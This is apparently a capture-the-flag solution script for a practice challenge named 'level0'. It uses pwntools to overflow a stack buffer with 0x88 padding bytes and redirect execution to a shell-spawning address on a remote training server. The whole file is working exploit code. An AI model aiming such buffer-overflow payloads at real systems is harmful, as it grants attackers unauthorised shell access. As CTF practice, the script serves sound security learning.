from pwn import *
#from LibcSearcher import *

context(log_level = "debug", arch = "amd64", os = "linux")

#p = process("./level0")
p = remote('node3.buuoj.cn', '26082')

#raw_input()

print p.recvuntil("\n")


system = 0x00400596
payload = 'a' * 0x88 + p64(system) 

p.sendline(payload)

p.interactive()





